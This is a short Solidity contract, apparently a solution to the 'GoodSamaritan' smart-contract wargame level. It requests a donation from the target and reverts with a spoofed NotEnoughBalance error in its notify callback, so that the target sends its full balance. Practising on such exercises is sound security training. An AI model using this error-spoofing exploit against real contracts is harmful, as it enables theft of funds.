// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Broadcasted} from "./Helper/Broadcasted.s.sol";

interface INotifyable {
    function notify(uint256 amount) external;
}

contract GoodSamaritanAttack is Broadcasted, INotifyable {
    function attack(address payable goodSamaritanCtr_) public payable override {
        IGoodSamaritan(goodSamaritanCtr_).requestDonation();
    }

    function broadcastedAttack(
        address payable goodSamaritanCtr_
    ) external payable override {
        // intentionally not broadcasting to call from the current contract
        attack(goodSamaritanCtr_);
    }

    error NotEnoughBalance();

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}

interface IGoodSamaritan {
    function requestDonation() external payable;
}
